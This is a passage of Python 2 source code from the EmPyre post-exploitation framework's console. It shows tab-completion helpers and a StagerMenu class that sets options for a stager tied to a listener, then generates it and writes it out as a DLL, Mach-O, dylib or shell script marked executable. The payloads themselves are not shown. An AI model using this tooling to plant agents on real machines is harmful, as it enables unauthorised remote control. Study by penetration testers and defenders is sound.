        # otherwise we're tab-completing an option name
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]

    def complete_unset(self, text, line, begidx, endidx):
        "Tab-complete a module option to unset."

        options = self.module.options.keys() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]

    def complete_usemodule(self, text, line, begidx, endidx):
        "Tab-complete an EmPyre Python module path."
        return self.mainMenu.complete_usemodule(text, line, begidx, endidx)

    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."
        return self.mainMenu.complete_creds(text, line, begidx, endidx)


class StagerMenu(cmd.Cmd):

    def __init__(self, mainMenu, stagerName, listener=None):
        cmd.Cmd.__init__(self)
        self.doc_header = 'Stager Menu'

        self.mainMenu = mainMenu

        # get the current stager name
        self.stagerName = stagerName
        self.stager = self.mainMenu.stagers.stagers[stagerName]

        # set the prompt text
        self.prompt = '(EmPyre: '+helpers.color("stager/"+self.stagerName, color="blue")+') > '

        # if this menu is being called from an listener menu
        if listener:
            # resolve the listener ID to a name, if applicable
            listener = self.mainMenu.listeners.get_listener(listener)
            self.stager.options['Listener']['Value'] = listener

    def validate_options(self):
        "Make sure all required stager options are completed."

        for option, values in self.stager.options.iteritems():
            if values['Required'] and ((not values['Value']) or (values['Value'] == '')):
                print helpers.color("[!] Error: Required stager option missing.")
                return False

        listenerName = self.stager.options['Listener']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            print helpers.color("[!] Invalid listener ID or name.")
            return False

        return True

    def emptyline(self):
        pass

    # print a nicely formatted help menu
    # stolen/adapted from recon-ng
    def print_topics(self, header, cmds, cmdlen, maxcol):
        if cmds:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for c in cmds:
                self.stdout.write("%s %s\n" % (c.ljust(17), getattr(self, 'do_' + c).__doc__))
            self.stdout.write("\n")

    def do_back(self, line):
        "Go back a menu."
        return True

    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()

    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()

    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()

    def do_exit(self, line):
        "Exit EmPyre."
        raise KeyboardInterrupt

    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(" ".join(line.split(" ")[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(" ".join(line.split(" ")[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")

    def do_info(self, line):
        "Display stager options."
        messages.display_stager(self.stagerName, self.stager)

    def do_options(self, line):
        "Display stager options."
        messages.display_stager(self.stagerName, self.stager)

    def do_set(self, line):
        "Set a stager option."

        parts = line.split()

        try:
            option = parts[0]
            if option not in self.stager.options:
                print helpers.color("[!] Invalid option specified.")

            elif len(parts) == 1:
                # "set OPTION"
                # check if we're setting a switch
                if self.stager.options[option]['Description'].startswith("Switch."):
                    self.stager.options[option]['Value'] = "True"
                else:
                    print helpers.color("[!] Please specify an option value.")
            else:
                # otherwise "set OPTION VALUE"
                option = parts[0]
                value = " ".join(parts[1:])

                if value == '""' or value == "''":
                    value = ""

                self.stager.options[option]['Value'] = value
        except:
            print helpers.color("[!] Error in setting option, likely invalid option name.")

    def do_unset(self, line):
        "Unset a stager option."

        option = line.split()[0]

        if line.lower() == "all":
            for option in self.stager.options:
                self.stager.options[option]['Value'] = ''
        if option not in self.stager.options:
            print helpers.color("[!] Invalid option specified.")
        else:
            self.stager.options[option]['Value'] = ''

    def do_generate(self, line):
        "Generate/execute the given EmPyre stager."

        if not self.validate_options():
            return

        stagerOutput = self.stager.generate()

        savePath = ''
        if 'OutFile' in self.stager.options:
            savePath = self.stager.options['OutFile']['Value']

        if savePath != '':
            # make the base directory if it doesn't exist
            if not os.path.exists(os.path.dirname(savePath)) and os.path.dirname(savePath) != '':
                os.makedirs(os.path.dirname(savePath))

            # if we need to write binary output for a .dll
            if ".dll" in savePath:
                f = open(savePath, 'wb')
                f.write(bytearray(stagerOutput))
                f.close()
            elif "macho" in self.stager.info['Name']:
                f = open(savePath, 'wb')
                f.write(stagerOutput)
                f.close()
                os.chmod(savePath, 0777)
            elif "dylib" in savePath:
                f = open(savePath, 'wb')
                f.write(stagerOutput)
                f.close()
                os.chmod(savePath, 0777)
            else:
                # otherwise normal output
                f = open(savePath, 'w')
                f.write(stagerOutput)
                f.close()

            # if this is a bash script, make it executable
            if ".sh" in savePath:
                os.chmod(savePath, 777)

            print "\n" + helpers.color("[*] Stager output written out to: "+savePath+"\n")
        else:
            print stagerOutput

    def do_execute(self, line):
        "Generate/execute the given EmPyre stager."
        self.do_generate(line)

    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a stager option to set."

        options = self.stager.options.keys()

        if line.split(" ")[1].lower() == "listener":
            # if we're tab-completing a listener name, return all the names
            listenerNames = self.mainMenu.listeners.get_listener_names()
            endLine = " ".join(line.split(" ")[1:])

            mline = endLine.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]

        elif line.split(" ")[1].lower().endswith("path"):
            # tab-complete any stager option that ends with 'path'
            return helpers.complete_path(text, line, arg=True)

        # otherwise we're tab-completing an option name
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]

    def complete_unset(self, text, line, begidx, endidx):
        "Tab-complete a stager option to unset."

        options = self.stager.options.keys() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]
